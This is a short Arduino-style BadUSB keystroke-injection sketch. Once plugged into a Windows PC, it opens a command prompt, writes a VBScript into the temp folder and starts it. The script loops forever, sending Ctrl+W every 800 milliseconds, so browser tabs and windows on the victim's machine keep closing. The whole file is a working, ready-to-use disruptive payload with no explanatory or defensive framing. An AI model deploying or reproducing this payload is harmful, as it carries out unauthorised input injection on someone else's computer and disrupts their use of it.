void setup()
{
  delay(1000);
  GUI_R();
  STRING("cmd");
  ENTER();
  STRING("cd %TEMP%");
  ENTER();
  STRING("powershell rm no-browser.vbs");
  ENTER();
  STRING("copy con no-browser.vbs");
  ENTER();
  STRING("do");
  ENTER();
  STRING("Set objShell = CreateObject(\"WScript.Shell\")");
  ENTER();
  STRING("WScript.Sleep 800");
  ENTER();
  STRING("objShell.SendKeys \"^{W}\"");
  ENTER();
  STRING("loop");
  CTRL_Z();
  ENTER();
  STRING ("start no-browser.vbs && exit");
  ENTER();
}
